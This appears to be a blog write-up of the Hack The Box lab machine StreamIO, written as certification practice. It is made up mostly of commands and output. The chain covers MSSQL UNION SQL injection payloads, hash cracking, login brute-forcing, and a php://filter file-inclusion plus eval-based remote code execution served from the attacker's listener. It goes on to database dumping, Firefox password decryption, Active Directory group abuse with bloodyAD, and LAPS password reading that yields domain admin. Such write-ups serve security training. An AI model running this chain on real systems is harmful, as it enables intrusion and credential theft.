---
title: "HTB StreamIO"
date: 2026-05-13 17:16 +0100
categories: [CPTS Preparation]
tags: [HTB, Machine, Windows, Medium, MSSQL]
image: /assets/img/posts/streamio/streamio.png
---
**HTB StreamIO** is a Windows machine where an initial `SQL injection` in the public site leads to admin access and a debug `LFI`, which is abused to get remote code execution and a low‑privilege shell; from there `MSSQL` credentials are recovered (`sqlcmd`) to dump user hashes, stored Firefox logins are extracted to obtain higher‑privilege domain credentials, `BloodHound` reveals a `ReadLAPS` misconfiguration, and that `ReadLAPS` abuse yields the `Domain Administrator` account and full domain takeover.

## Reconnaissance
### Scanning
- Nmap (All ports)
```
nmap -p- 10.129.32.118 -nv --min-rate 1000
```
```
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49677/tcp open  unknown
49678/tcp open  unknown
49708/tcp open  unknown
52946/tcp open  unknown
```
- NSE Scripts & Version
```
nmap -sCV -p53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,49667,49677,49678,49708,52946 10.129.32.118 -nv --min-rate 1000
```
```
PORT      STATE SERVICE       VERSION                                                                                                                        
53/tcp    open  domain        Simple DNS Plus                                                                                                                
80/tcp    open  http          Microsoft IIS httpd 10.0                                                                                                       
| http-methods:                                                                                                                                              
|   Supported Methods: OPTIONS TRACE GET HEAD POST                                                                                                           
|_  Potentially risky methods: TRACE                                                                                                                         
|_http-server-header: Microsoft-IIS/10.0                                                                                                                     
|_http-title: IIS Windows Server                                                                                                                             
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-14 00:02:43Z)                                                                 
135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                          
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                  
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb, Site: Default-First-Site-Name)                                  
443/tcp   open  ssl/https?                                                                                                                                   
| ssl-cert: Subject: commonName=streamIO/countryName=EU                                                                                                      
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb                                                                                         
| Issuer: commonName=streamIO/countryName=EU                                                                                                                 
| Public Key type: rsa                                                                                                                                       
| Public Key bits: 2048                                                                                                                                      
| Signature Algorithm: sha256WithRSAEncryption                                                                                                               
| Not valid before: 2022-02-22T07:03:28                                                                                                                      
| Not valid after:  2022-03-24T07:03:28
| MD5:     b99a 2c8d a0b8 b10a eefa be20 4abd ecaf
| SHA-1:   6c6a 3f5c 7536 61d5 2da6 0e66 75c0 56ce 56e4 656d
|_SHA-256: 1efc 48cc 0bd9 757f c585 d1fb 7e52 5009 ed0a a3e9 9acc 1a97 0b26 8418 6801 bf09
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2026-05-14T00:04:56+00:00; +6h59m49s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
52946/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-time: 
|   date: 2026-05-14T00:03:42
|_  start_date: N/A
|_clock-skew: mean: 6h59m48s, deviation: 0s, median: 6h59m47s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```
- Subject Alternative Name: DNS:`streamIO.htb`, DNS:`watch.streamIO.htb`
### Configuration
- /etc/hosts
```
sudo nxc smb 10.129.32.118 --generate-hosts-file /etc/hosts
```
- /etc/krb5.conf
```
sudo nxc smb DC.streamIO.htb --generate-krb5-file /etc/krb5.conf
```
## watch.streamIO.htb
### fuzzing
```
ffuf -u https://watch.streamio.htb/FUZZ.php -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt
```
```
search                  [Status: 200, Size: 253887, Words: 12366, Lines: 7194, Duration: 1181ms]
```
### SQLi
- MSSQL Payloads : [PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/MSSQL%20Injection/)
- UNION
```
q=500' union select 1,@@version,3,4,5,6;-- -
```
![UNION](/assets/img/posts/streamio/union.png)
- Enumerate Database
```
q=500' union select 1,string_agg(name, ', '),3,4,5,6 from master..sysdatabases;-- -
```
```
master, tempdb, model, msdb, STREAMIO, streamio_backup
```
- Enumerate Tables
```
q=500' union select 1,string_agg(name, ', '),3,4,5,6 from STREAMIO..sysobjects where xtype='u';-- -
```
```
movies, users
```
- Enumerate Columns
```
q=500' union select 1,string_agg(name, ', '),3,4,5,6 from syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users');-- -
```
```
id, is_staff, password, username
```
- Extract the data
```
q=500' UNION SELECT 1,STRING_AGG(CONCAT(username,':',password), ', '),3,4,5,6 FROM users;-- -
```
- md5
```
James:c660060492d9edcaa8332d89c99c9239
Theodore:925e5408ecb67aea449373d668b7359e
Samantha:083ffae904143c4796e464dac33c1f7d
Lauren:08344b85b329d7efd611b7a7743e8a09
William:d62be0dc82071bccc1322d64ec5b6c51
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5
Robert:f03b910e2bd0313a23fdd7575f34a694
Thane:3577c47eb1e12c8ba021611e1280753c
Carmon:35394484d89fcfdb3c5e447fe749d213
Barry:54c88b2dbd7b1a84012fabc1a4c73415
Oliver:fd78db29173a5cf701bd69027cb9bf6b
Michelle:b83439b16f844bd6ffe35c02fe21b3c0
Gloria:0cfaaaafb559f081df2befbe66686de0
Victoria:b22abb47a02b52d5dfa27fb0b534f693
Alexendra:1c2b3d8270321140e5153f6637d3ee53
Baxter:22ee218331afd081b0dcd8115284bae3
Clara:ef8f3d30a856cf166fb8215aca93e9ff
Barbra:3961548825e3e21df5646cafe11c6c76
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f
Austin:0049ac57646627b8d7aeaccf8b6a936f
Garfield:8097cedd612cc37c29db152b6e9edbd3
Juliette:6dcd87740abb64edfa36d170f0d5450d
Victor:bf55e15b119860a6e6b5a164377da719
Lucifer:7df45a9e3de3863807c026ba48e55fb3
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8
Diablo:ec33265e5fc8c2f1b0c137bb7b3632b5
Robin:dc332fb5576e9631c9dae83f194f8e70
Stan:384463526d288edcc95fc3701e523bc7
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332
admin:665a50ac9eaa781e4f7f04199db97a11
```
### hashcat
```
hashcat -a 0 -m 0 --user hash.txt wordlists/rockyou.txt -d 1 -O
```
```
hashcat -a 0 -m 0 --user hash.txt wordlists/rockyou.txt -d 1 -O --show
...
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical
Barry:54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
Clara:ef8f3d30a856cf166fb8215aca93e9ff:%$clara
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
Juliette:6dcd87740abb64edfa36d170f0d5450d:$3xybitch
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd
```
### Valid Creds
- Login Brute-force
```
hydra -C combined_creds.txt streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:Login failed" -V
```
- DONE
```
yoshihide:66boysandgirls..
```
## streamIO.htb
### Admin Panel
![UNION](/assets/img/posts/streamio/admin.png)
- FUZZ with valid session
```
ffuf -u 'https://streamio.htb/admin/?FUZZ=id' -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 1678 -H 'Cookie: PHPSESSID=i4fcualco9rivu0pa49fdbplte'
```
```
debug                   [Status: 200, Size: 1712, Words: 90, Lines: 50, Duration: 156ms]
```
```
ffuf -u 'https://streamio.htb/admin/FUZZ.php' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -H 'Cookie: PHPSESSID=i4fcualco9rivu0pa49fdbplte'
```
```
index                   [Status: 200, Size: 1678, Words: 85, Lines: 50, Duration: 858ms]
master                  [Status: 200, Size: 58, Words: 5, Lines: 2, Duration: 159ms]
```
![dbg1](/assets/img/posts/streamio/debug1.png)
### File Inclusion
- index.php
```
https://streamio.htb/admin/?debug=php://filter/read=convert.base64-encode/resource=index.php
```
```php
<?php
define('included',true);
session_start();
if(!isset($_SESSION['admin']))
{
	header('HTTP/1.1 403 Forbidden');
	die("<h1>FORBIDDEN</h1>");
}
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
$handle = sqlsrv_connect('(local)',$connection);
?>
```
```php
 <?php
    if(isset($_GET['debug']))
    {
        echo 'this option is for developers only';
        if($_GET['debug'] === "index.php") {
            die(' ---- ERROR ----');
    } else {
            include $_GET['debug'];
        }
    }
    else if(isset($_GET['user']))
        require 'user_inc.php';
    else if(isset($_GET['staff']))
        require 'staff_inc.php';
    else if(isset($_GET['movie']))
        require 'movie_inc.php';
    else 
?>
```
- master.php
```php
<?php
if(!defined('included'))
	die("Only accessable through includes");
?>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```
### Exploit
![burp](/assets/img/posts/streamio/burp1.png)
```
➜  StreamIO nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.10.14.141] from (UNKNOWN) [10.129.32.118] 53151
GET /rce.php HTTP/1.0
Host: 10.10.14.141:9999
Connection: close
```
```php
system("whoami");
```

```html
<form method="POST">
<input name="include" hidden>
</form>
streamio\yoshihide
```

### sqlcmd
```php
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
```
```
PS C:\> sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;"
table_name                                                                                                                      
--------------------------------------------------------------------------------------------------------------------------------
movies                                                                                                                          
users                                                                                                                           

(2 rows affected)
```
```
PS C:\> sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
id          username                                           password                                          
----------- -------------------------------------------------- --------------------------------------------------
          1 nikk37                                             389d14cb8e4e9b94b137deb1caf0612a                  
          2 yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332                  
          3 James                                              c660060492d9edcaa8332d89c99c9239                  
          4 Theodore                                           925e5408ecb67aea449373d668b7359e                  
          5 Samantha                                           083ffae904143c4796e464dac33c1f7d                  
          6 Lauren                                             08344b85b329d7efd611b7a7743e8a09                  
          7 William                                            d62be0dc82071bccc1322d64ec5b6c51                  
          8 Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5                  
(8 rows affected)
PS C:\> 
```
```
nikk37:389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
```
## Shell
### Shell as nikk37
```
➜  StreamIO nxc smb DC.streamIO.htb -u 'nikk37' -p 'get_dem_girls2@yahoo.com'                                                                  
SMB         10.129.32.118   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:None)
SMB         10.129.32.118   445    DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com 
➜  StreamIO nxc winrm DC.streamIO.htb -u 'nikk37' -p 'get_dem_girls2@yahoo.com'
WINRM       10.129.32.118   5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb) 
WINRM       10.129.32.118   5985   DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com (Pwn3d!)
```
```
evil-winrm -i DC.streamIO.htb -u 'nikk37' -p 'get_dem_girls2@yahoo.com'
```
### Firefox logins
```
*Evil-WinRM* PS C:\Users\nikk37> cd C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles
*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles> dir
...
d-----        2/22/2022   2:40 AM                5rwivk2l.default
d-----        2/22/2022   2:42 AM                br53rxeg.default-release
```
```
Compress-Archive -Path .\br53rxeg.default-release -DestinationPath .\1.zip
```
- [firepwd](https://github.com/lclevy/firepwd)

```
python3 firepwd/firepwd.py #key4.db & logins.json
```
```
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```
### creds for JDgodd
```
➜  StreamIO nxc winrm DC.streamIO.htb -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r'
WINRM       10.129.32.118   5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb) 
WINRM       10.129.32.118   5985   DC               [-] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r
➜  StreamIO nxc smb DC.streamIO.htb -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r'
SMB         10.129.32.118   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:None)
SMB         10.129.32.118   445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r 
➜  StreamIO nxc ldap DC.streamIO.htb -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r'
LDAP        10.129.32.118   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.32.118   389    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r 
➜  StreamIO 
```
### Bloodhound
```
bloodhound-python -c All -u jdgodd -p 'JDg0dd1s@d0p3cr3@t0r' -ns 10.129.32.118 -d streamio.htb -dc streamio.htb --zip
```

![blood](/assets/img/posts/streamio/blood.png)

```
bloodyAD -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r' -d streamIO.htb --host DC.streamIO.htb add genericAll "CORE STAFF" 'JDgodd'
```

```
bloodyAD -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r' -d streamIO.htb --host DC.streamIO.htb add groupMember "CORE STAFF" 'JDgodd'
```

```
rusthound-ce --domain streamio.htb -u jdgodd -p 'JDg0dd1s@d0p3cr3@t0r' -z
```

- LAPS

```
nxc smb DC.streamIO.htb -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r' --laps                                                       
SMB         10.129.32.118   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:None)
SMB         10.129.32.118   445    DC               [-] DC\administrator:6Ax#6Y&QEBQmSZ STATUS_LOGON_FAILURE
```
```
ldapsearch -x -H ldap://10.129.32.118:389 -D 'JDgodd@streamio.htb' -w 'JDg0dd1s@d0p3cr3@t0r' -b 'DC=streamIO,DC=htb' -E pr=1000/noprompt "(ms-Mcs
-AdmPwd=*)" ms-Mcs-AdmPwd
```
### Shell as Administrator
```
➜  StreamIO nxc smb DC.streamIO.htb -u 'administrator' -p '6Ax#6Y&QEBQmSZ'
SMB         10.129.32.118   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:None)
SMB         10.129.32.118   445    DC               [+] streamIO.htb\administrator:6Ax#6Y&QEBQmSZ (Pwn3d!)
```